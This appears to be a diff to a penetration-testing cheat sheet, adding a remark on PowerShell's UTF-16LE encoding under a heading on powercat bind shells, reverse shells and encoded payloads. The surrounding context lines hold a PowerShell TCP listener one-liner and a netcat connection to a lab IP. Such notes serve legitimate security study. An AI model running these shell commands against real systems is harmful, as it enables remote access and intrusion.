@@ -71,6 +71,7 @@ powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',4
 nc -nv 10.11.0.22 443
 ```
 ### load powercat, bindshell, reverse shell, encrypted payloads
+>Generally speaking, Windows PowerShell uses Unicode UTF-16LE encoding by default. However, the default encoding used by cmdlets in Windows PowerShell is inconsistent.
 ```
 powercat.ps1
   -ge             Generate Encoded Payload. Does the same as -g, but returns a string which
